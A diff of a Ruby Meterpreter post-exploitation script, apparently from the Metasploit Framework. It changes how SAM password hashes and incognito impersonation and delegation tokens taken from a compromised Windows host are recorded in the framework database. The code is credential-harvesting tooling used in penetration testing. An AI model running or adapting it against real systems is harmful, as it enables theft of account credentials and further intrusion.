@@ -30,36 +30,33 @@ hashes = client.priv.sam_hashes
 
 # Target infos for the db record
 addr = client.sock.peerhost
-host = client.framework.db.report_host_state(self, addr, Msf::HostState::Alive)
+host = client.framework.db.find_or_create_host(:host => addr, :state => Msf::HostState::Alive)
 
-# Record hashes to the running db instance as auth_HASH type
-hashes.each do |user|
+# Record hashes to the running db instance
+hashes.each do |hash|
+	data = {}
+	data[:host]  = host
+	data[:proto] = 'smb'
+	data[:user]  = hash.user_name
+	data[:hash]  = hash.lanman + ":" + hash.ntlm
+	data[:targ_host]   = host.address
+	data[:hash_string] = hash.hash_string
 
-	type = "auth_HASH"
-	data = user.to_s
-	client.framework.db.queue Proc.new {
-		# We'll make this look like an auth note anyway
-		client.framework.db.get_note(self, host, type, data)
-	}
+	client.framework.db.report_auth_info(data)
 end
 
 # Record user tokens
 tokens = client.incognito.incognito_list_tokens(0)
 raise Rex::Script::Completed if not tokens
 
-# Grab just the values
-tokens = tokens.values
-
 # Meh, tokens come to us as a formatted string
-tokens = tokens.to_s.strip.split("\n")
+(tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
+	data = {}
+	data[:host]      = host
+	data[:proto]     = 'smb'
+	data[:token]     = token
+	data[:targ_host] = host.address
 
-tokens.each do |token|
-	type = "auth_TOKEN"
-	data = token
-
-	client.framework.db.queue Proc.new {
-		# We'll make this look like an auth note anyway
-		client.framework.db.get_note(self, host, type, data)
-	}
+	client.framework.db.report_auth_info(data)
 end
 
